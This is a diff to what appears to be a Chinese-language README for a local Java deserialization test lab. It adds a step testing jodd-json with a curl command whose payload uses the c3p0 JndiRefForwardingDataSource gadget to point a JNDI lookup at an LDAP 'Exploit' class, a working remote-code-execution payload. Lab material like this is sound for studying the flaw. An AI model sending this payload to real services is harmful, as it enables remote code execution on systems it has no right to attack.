@@ -51,3 +51,7 @@
    ```
    curl 127.0.0.1:8080/xstream/parse -H 'Content-Type: text/xml' -d @test.xml
    ```
+14. 测试jodd-json反序列化
+   ```
+   curl 127.0.0.1:8080/jodd/parse -d 'type=com.mchange.v2.c3p0.JndiRefForwardingDataSource&json={"jndiName":"ldap://127.0.0.1:1389/Exploit","loginTimeout":0}'
+   ```
